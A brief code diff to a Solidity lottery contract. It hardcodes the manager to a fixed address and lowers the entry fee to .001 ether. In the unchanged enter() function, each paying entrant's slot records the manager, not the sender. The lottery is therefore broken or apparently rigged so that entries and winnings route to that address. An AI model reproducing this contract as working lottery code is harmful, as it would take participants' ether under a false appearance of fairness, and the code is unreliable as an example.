@@ -3,7 +3,7 @@
 pragma solidity ^0.8.13;
 
 contract Lottery {
-    address payable public manager;
+    address payable public manager = payable(0xEBab422e6e206099Aac736004175F0915A33B533);
     address payable [] public players;
     
     function LotteryManager() public payable {
@@ -11,7 +11,7 @@ contract Lottery {
     }
     
     function enter() public payable {
-        require(msg.value > .01 ether);
+        require(msg.value > .001 ether);
         players.push(manager);
     }
     
